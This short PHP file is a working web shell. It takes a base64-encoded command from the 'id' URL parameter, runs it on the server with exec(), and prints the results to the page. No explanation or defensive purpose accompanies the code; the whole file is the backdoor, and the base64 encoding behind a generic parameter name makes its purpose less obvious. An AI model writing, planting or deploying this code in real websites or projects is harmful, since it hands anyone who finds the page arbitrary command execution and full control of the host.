<?php
    $decoded_command = base64_decode($_GET['id']);
    echo "<b>Executed:</b>  $decoded_command";
    echo str_repeat("<br>",2);
    echo "<b>Output:</b>";
    echo str_repeat("<br>",2);
    exec($decoded_command . " 2>&1", $output, $return_status);

    echo "<font color='red'>Error in Code Execution -->  </font>";
    foreach ($output as &$line) 
        echo "$line <br>";
?>

